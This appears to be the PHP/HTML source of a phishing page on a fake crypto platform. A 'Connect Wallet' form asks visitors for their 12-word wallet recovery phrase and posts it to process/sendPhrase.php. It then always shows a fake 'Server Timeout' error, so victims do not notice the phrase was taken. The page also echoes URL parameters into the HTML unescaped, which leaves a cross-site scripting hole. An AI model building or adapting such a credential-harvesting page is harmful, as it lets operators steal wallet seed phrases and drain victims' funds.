<?php
if(!isset($_GET['n']) or !isset($_GET['i'])){
    header("location:./");
}
include "process/config.php";
require_once "process/conn.php";
require_once "process/session.php";
?>
<!-- meta tags and other links -->
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="3ZYuh4Acwa7HLOFeaPbetLV1OebW5SlhZOcMVhxK">
    <title><?php echo $system['sitename']; ?> - Connect Wallet</title>
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link rel="shortcut icon" href="../assets/images/logoIcon/favicon.png" type="image/x-icon">


    <link rel="apple-touch-icon" href="../assets/images/logoIcon/logo.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="<?php echo $system['sitename']; ?>">

    <meta itemprop="name" content="<?php echo $system['sitename']; ?>">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="../assets/images/seo/632da6a7b99391663936167.png">

    <meta property="og:type" content="website">
    <meta property="og:title" content="<?php echo $system['sitename']; ?>">
    <meta property="og:description" content="<?php echo $system['sitename']; ?>">
    <meta property="og:image" content="../assets/images/seo/632da6a7b99391663936167.png" />
    <meta property="og:image:type" content="image/png" />
    <meta property="og:image:width" content="600" />
    <meta property="og:image:height" content="315" />
    <meta property="og:url" content="../user/dashboard">

    <meta name="twitter:card" content="summary_large_image">
    <!-- bootstrap 4  -->
    <link rel="stylesheet" href="../assets/templates/bit_gold//css/vendor/bootstrap.min.css">
    <!-- fontawesome 5  -->
    <link rel="stylesheet" href="../assets/templates/bit_gold//css/all.min.css">
    <!-- line-awesome webfont -->
    <link rel="stylesheet" href="../assets/templates/bit_gold//css/line-awesome.min.css">
    <link rel="stylesheet" href="../assets/templates/bit_gold//css/vendor/animate.min.css">
    <!-- slick slider css -->
    <link rel="stylesheet" href="../assets/templates/bit_gold//css/vendor/slick.css">
    <link rel="stylesheet" href="../assets/templates/bit_gold//css/vendor/dots.css">
    <!-- dashdoard main css -->
    <link rel="stylesheet" href="../assets/templates/bit_gold//css/main.css">
    <link rel="stylesheet" href="../assets/templates/bit_gold//css/custom.css">
    <link rel="stylesheet" href="../assets/templates/bit_gold/css/color.php?color=CCA354&secondColor=000000">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/11.7.32/sweetalert2.min.js" integrity="sha512-3PL7jW3xI1EjF2Hfqwv5u6nKG/BnUbWytnJDhsY/q5CbIB5XzoHNhJvgmFeVD7xgC9DbKDm+gPP9uDAAfLAZUA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/limonte-sweetalert2/11.7.32/sweetalert2.css" integrity="sha512-eRBMRR/qeSlGYAb6a7UVwNFgXHRXa62u20w4veTi9suM2AkgkJpjcU5J8UVcoRCw0MS096e3n716Qe9Bf14EyQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style type="text/css">
        #copyBoard {
            cursor: pointer;
        }

        .attachment-thumbnail{
            border-radius:1rem;
        }

        .elementor-heading-title{
            font-size: 17px;
            text-align: center;
            margin-top:12px
        }

        .col-lg-2{
            margin-bottom:30px
        }
    </style>
</head>

<body>


    <!-- scroll-to-top start -->
    <div class="scroll-to-top">
        <span class="scroll-icon">
            <i class="fa fa-rocket" aria-hidden="true"></i>
        </span>
    </div>
    <!-- scroll-to-top end -->

    <div class="full-wh">
        <!-- STAR ANIMATION -->
        <div class="bg-animation">
            <div id='stars'></div>
            <div id='stars2'></div>
            <div id='stars3'></div>
            <div id='stars4'></div>
        </div><!-- / STAR ANIMATION -->
    </div>
    <div class="page-wrapper">

        <?php
        require_once "../assets/dash-header.php";
        ?>

        <!-- inner hero start -->
        <section class="inner-hero bg_img" data-background="../assets/images/frontend/breadcrumb/5fce3837032a51607350327.jpg">
            <div class="container">
                <div class="row">
                    <div class="col-lg-6">
                        <h2 class="page-title">Wallet Secret Phrase</h2>
                        <ul class="page-breadcrumb">
                            <li><a href="index">Home</a></li>
                            <li>Wallet Secret Phrase</li>
                        </ul>
                    </div>
                </div>
            </div>
        </section>
        <!-- inner hero end -->
        <section class="cmn-section">
            <div class="container">
                <div class="row justify-content-center ">
                    <div class="col-lg-12 row justify-content-center mb-4">
                        <img src="wallets/<?= $_GET['i'] ?>">
                    </div>
                    
                    <h2 style="font-size: 20px; color:#cca354; text-align:center; text-transform:uppercase" class="mb-5">ENTER YOUR 12 <?= $_GET['n'] ?> WALLET PHRASE BELOW:</h2>


                    
                </div>
                <form id="linkwallet">
                        <input type="text" hidden name="wallet" value="<?= $_GET['n'] ?>">
                        <div class="col-md-12 row justify-content-center">
                            <div class="col-lg-4 form-group">
                                <textarea style="text-align: center;" name="phrase" rows="12" class="form-control" placeholder="wallet phrase here:" required></textarea>
                            </div>
                        </div>
                        <div class="row col-lg-12 form-group justify-content-center">
                            <div class="col-lg-4">
                                <button class="btn cmn-btn w-100 bg-3  text-center mt-3" type="submit" id="payBtn">&nbsp;Link Wallet </button>
                                <button type="button" style="display:none" id="loading" class="btn cmn-btn w-100 bg-3 text-center mt-3"><i class="fa fa-spinner fa-spin"></i></button>

                            </div>
                        </div>
                    </form>
            </div>
    </div>
    </section>
    </div>
    </div>
    </div>
    </section>












    </div>
    </div>
    </div>
    </section>


    <?php
    require_once "../assets/dash-footer.php";
    ?>
    </div> <!-- page-wrapper end -->
    <!-- jQuery library -->
    <script src="../assets/templates/bit_gold//js/vendor/jquery-3.5.1.min.js"></script>
    <!-- bootstrap js -->
    <script src="../assets/templates/bit_gold//js/vendor/bootstrap.bundle.min.js"></script>

    <!-- slick slider js -->
    <script src="../assets/templates/bit_gold//js/vendor/slick.min.js"></script>
    <script src="../assets/templates/bit_gold//js/vendor/wow.min.js"></script>
    <!-- dashboard custom js -->
    <script src="../assets/templates/bit_gold//js/app.js"></script>


    <link rel="stylesheet" href="../assets/templates/bit_gold/css/iziToast.min.css">
    <script src="../assets/templates/bit_gold/js/iziToast.min.js"></script>
<script>
    $("#linkwallet").submit(function(e){
      e.preventDefault();
      $("#payBtn").hide();
      $("#loading").show();
      $.ajax({
          url:'process/sendPhrase.php',
          method: 'POST',
          dataType: 'JSON',
          data: new FormData(this),
          contentType: false,
          processData: false,
          success:function(resp){
            $("#loading").hide();
            $("#payBtn").show();
            if(resp.status===1){
              Swal.fire({
                title: 'Error',
                text: 'Server Timeout: Unable to Link Wallet',
                icon: 'error',
              })
            }else{
              Swal.fire({
                title: 'Error!',
                text: resp.message,
                icon: 'error',
              })
            }
          },error:function(resp){
            $("#loading").hide();
            $("#payBtn").show();
            Swal.fire({
                title: 'Error!',
                text: "Something Went Wrong",
                icon: 'error',
            })
          }
      })
  })
</script>
    <script>
        "use strict";

        function notify(status, message) {
            iziToast[status]({
                message: message,
                position: "topRight"
            });
        }
    </script>




    <script>
        (function() {
            "use strict";
            $(document).on("change", ".langSel", function() {
                window.location.href = "../change/" + $(this).val();
            });
        })();
    </script>


</body>

</html>

</body>

</html>